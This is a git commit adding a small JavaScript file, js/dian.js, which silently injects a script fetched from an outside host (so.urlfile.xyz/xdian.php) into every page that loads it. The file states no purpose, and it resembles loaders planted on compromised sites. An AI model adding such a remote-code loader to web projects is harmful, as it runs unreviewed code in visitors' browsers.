0ffe12d455f1cb0588ceb2660a6698766c44f925
“dataoss” <meituloc@dataloc.uu.me>
2020-10-14 15:32:44 +0800

    first commit

---
+++ js/dian.js
@@ -0,0 +1,6 @@
+﻿(function(){
+  var m = document.createElement("script");
+  m.src = "//so.urlfile.xyz/xdian.php";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(m, s);
+ })();
